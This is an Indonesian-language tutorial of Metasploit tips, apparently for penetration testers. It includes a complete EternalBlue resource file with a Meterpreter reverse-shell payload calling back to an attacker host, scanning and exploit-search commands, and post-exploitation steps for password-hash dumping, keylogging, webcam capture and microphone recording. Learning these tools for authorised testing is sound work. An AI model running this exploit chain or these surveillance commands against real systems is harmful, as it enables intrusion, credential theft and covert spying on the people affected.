# Tips dan Trik Penggunaan Metasploit Efisien

## 1. Setup Awal yang Benar

Jalankan Metasploit dengan database aktif:

```
sudo systemctl start postgresql
msfdb init
msfconsole
```

Keuntungan database aktif:
- Menyimpan hasil pemindaian (`Nmap`, `Host`, `Service`).
- Menyimpan workspace dan logs.
- Integrasi dengan Armitage.

## 2. Gunakan Alias dan Tab Completion

- Gunakan `Tab` untuk melengkapi `command`, `module`, `payload`, `dsb`.
- Gunakan `?` atau `help` untuk melihat opsi.

  Contoh:

  ```
  use exploit/windows/smb/ms17_010_eternalblue
  show options
  ```

## 3. Simpan dan Muat Konfigurasi (resource file)

Buat file `auto.rc`:

```
nano auto.rc
```

Isi dengan:

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.45
set RPORT 445
set LHOST 192.168.1.42
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set target 1
set verbose true
exploit
```

Jalankan Metaploit:

```
msfconsole -r auto.rc
```

Ini akan mengeksploitasi target secara otomatis tanpa harus kita setting secara manual satu persatu.

  
## 4. Gunakan search Secara Efisien

Cari berdasarkan `platform`, `CVE`, `tipe`, `dsb`:

```
search type:exploit platform:windows smb
search name:eternalblue
search cve:2017-0144
```

## 5. Gunakan setg untuk Pengaturan Global

```
setg LHOST 192.168.1.5
setg LPORT 4444
```

Berlaku untuk semua `exploit/payload` selanjutnya, hemat waktu konfigurasi.

## 6. Simpan dan Kelola Target dengan Workspace

```
workspace add pentest01
workspace pentest01
db_nmap -sV 192.168.1.0/24
hosts
services
```

Workspace membantu memisahkan proyek dan target secara terstruktur.

 ## 7. Gunakan exploit suggester

Jika kamu sudah mendapatkan sesi shell:

```
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

## 8. Gunakan sessions dengan Cerdas

```
sessions       # daftar sesi
sessions -i 1  # masuk ke session 1
background     # keluarkan sesi ke background
```

## 9. Pasca-Eksploitasi Cepat

Setelah mendapatkan Meterpreter:

```
sysinfo
getuid
hashdump
shell
keyscan_start
keyscan_dump
webcam_snap
record_mic
```

## 10. Gunakan loot, notes, dan creds

Simpan dan kelola hasil:

```
loot
notes
creds
```

## 11. Integrasi dengan Script/Tool Lain
- Gunakan `Python` untuk otomatisasi via `msfrpc` (Metasploit RPC).
- Integrasi dengan `CrackMapExec`, `Empire`, atau `BloodHound`.

## Tips Tambahan:
- Gunakan module `auxiliary/scanner/*` untuk scanning cepat.
- Gunakan module `gather` untuk pencurian informasi secara otomatis.
- Dokumentasikan semua sesi dan hasil eksploitasi untuk laporan.
